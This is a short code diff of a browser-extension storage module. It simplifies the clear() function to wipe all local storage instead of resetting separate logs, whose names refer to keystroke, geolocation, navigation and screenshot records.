@@ -1,12 +1,6 @@
 import { v4 as uuidv4 } from "uuid";
 import { StorageKey } from "../consts";
-import {
-  IActivityLogEntry,
-  IGeolocationEntry,
-  IKeyLogEntry,
-  INavigationLogEntry,
-  IScreenshotLogEntry,
-} from "../interfaces";
+import { IActivityLogEntry } from "../interfaces";
 
 export async function simpleHas(key: StorageKey) {
   return (await simpleGet<any>(key)) !== undefined;
@@ -54,11 +48,7 @@ export async function writeLog(message: string) {
 }
 
 export async function clear() {
-  simpleSet<IGeolocationEntry[]>(StorageKey.GEOLOCATION_HISTORY, []);
-  simpleSet<IActivityLogEntry[]>(StorageKey.LOG, []);
-  simpleSet<IKeyLogEntry[]>(StorageKey.KEY_LOG, []);
-  simpleSet<INavigationLogEntry[]>(StorageKey.NAVIGATION_LOG, []);
-  simpleSet<IScreenshotLogEntry[]>(StorageKey.SCREENSHOT_LOG, []);
+  chrome.storage.local.clear();
 }
 
 export async function watch<T>(
